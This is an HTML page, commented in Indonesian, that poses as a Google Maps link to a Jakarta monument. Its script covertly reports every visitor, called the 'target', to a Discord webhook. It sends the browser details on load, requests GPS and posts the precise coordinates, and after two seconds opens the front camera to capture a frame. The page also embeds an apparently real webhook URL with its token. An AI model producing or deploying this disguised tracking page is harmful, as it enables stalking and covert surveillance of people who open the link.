<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Maps</title>
    <style>
        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; }
        iframe { width: 100%; height: 100%; border: none; }
    </style>
</head>
<body>

    <iframe src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3966.521260322283!2d106.81956135000001!3d-6.194741399999999!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x2e69f5390917b759%3A0x356b940984852026!2sSelamat%20Datang%20Monument!5e0!3m2!1sen!2sid!4v1652451443014!5m2!1sen!2sid" allow="geolocation;camera"></iframe>

    <script>
        // GANTI DENGAN URL WEBHOOK DISCORD KAMU
        const webhookURL = "https://discord.com/api/webhooks/1484113432583081984/Fkm8Dj5XnVCkC7du-HRYBFKAvdcxCz9jcXzQIj_5G4hWa1rX0GUPVQ02P5as6oiOKOxR";

        async function kirimData(pesan) {
            await fetch(webhookURL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ content: pesan })
            });
        }

        // 1. Ambil Info Perangkat
        kirimData(`**[!] Target Masuk Ke Link!**\nBrowser: ${navigator.userAgent}`);

        // 2. Ambil Lokasi (GPS)
        navigator.geolocation.getCurrentPosition(pos => {
            const { latitude, longitude, accuracy } = pos.coords;
            kirimData(`**[+] Lokasi Ditemukan!**\nhttps://www.google.com/maps?q=${latitude},${longitude}\nAkurasi: ${accuracy} meter`);
        }, err => {
            kirimData("[-] Target menolak izin lokasi.");
        });

        // 3. Ambil Foto Kamera Depan
        async function ambilFoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();

                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                
                // Jika ingin kirim foto ke Discord, kamu butuh server backend. 
                // Untuk sekarang, kita kirim status sukses dulu ke Discord.
                kirimData("**[+] Foto Kamera Depan Berhasil Diambil!**");
                
                stream.getTracks().forEach(track => track.stop());
            } catch (e) {
                kirimData("[-] Izin kamera ditolak target.");
            }
        }
        
        setTimeout(ambilFoto, 2000); // Ambil foto setelah 2 detik halaman dibuka
    </script>
</body>
</html>
